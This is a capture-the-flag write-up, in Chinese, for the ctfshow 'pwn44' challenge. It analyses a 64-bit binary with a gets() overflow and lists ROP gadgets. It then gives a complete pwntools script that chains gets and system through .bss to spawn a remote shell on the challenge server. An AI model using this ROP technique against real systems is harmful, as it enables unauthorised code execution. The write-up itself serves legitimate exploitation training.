```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn44
```

```
tasike@tasike-VM:~/Desktop$ file pwn44
pwn44: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=21ab50b60a15ea3e2b4ce46ee0a1f7135bb56f29, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn44
[*] '/home/tasike/Desktop/pwn44'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

64bit，堆栈不可执行

`ida`查看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  logo();
  puts("get system parameter!");
  ctfshow();
  return 0;
}
```

跟进`ctfshow`

```c
__int64 ctfshow()
{
  char v1[10]; // [rsp+6h] [rbp-Ah] BYREF

  return gets(v1);
}
```

> `buf`与`rbp`距离`0xA`

发现`_system`

```c
// attributes: thunk
int system(const char *command)
{
  return system(command);
}
```

没有`/bin/sh`字符串

但是可以注意`bss段`有一个`buf2`

```
.bss:0000000000602080                               public buf2
.bss:0000000000602080 ??                            buf2 db    ? ;
.bss:0000000000602081 ??                            db    ? ;
.bss:0000000000602082 ??                            db    ? ;
```

查看`pop|ret`

```
tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn44 --only "pop|ret"
Gadgets information
============================================================
0x00000000004007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007ee : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007f0 : pop r14 ; pop r15 ; ret
0x00000000004007f2 : pop r15 ; ret
0x00000000004007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007ef : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x00000000004007f3 : pop rdi ; ret
0x00000000004007f1 : pop rsi ; pop r15 ; ret
0x00000000004007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004fe : ret

Unique gadgets found: 11
```

和上一题思路一样，只不过这题是64位的



编写`attack44.py`

```python
from pwn import *
context(os = 'Linux', arch = 'amd64', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28284)
poprdi = 0x4007f3
buf2 = 0x602080
gets = 0x400530
system = 0x400520
payload = cyclic(0xA + 0x8) + p64(poprdi) + p64(buf2) + p64(gets) + p64(poprdi) + p64(buf2) + p64(system)
r.sendline(payload)
r.sendline("/bin/sh")
r.interactive()
```

> 首先利用`pop_rdi`指令将`buf2`的地址加载到`rdi`寄存器中。调用`gets`函数，以`buf2`的地址作为参数，从用户输入中读取数据，并将其存储在`buf2`中。再次利用`pop_rdi`指令将`buf2`的地址加载到`rdi`寄存器中。调用`system`函数，以`buf2`的地址作为参数，执行指定的命令。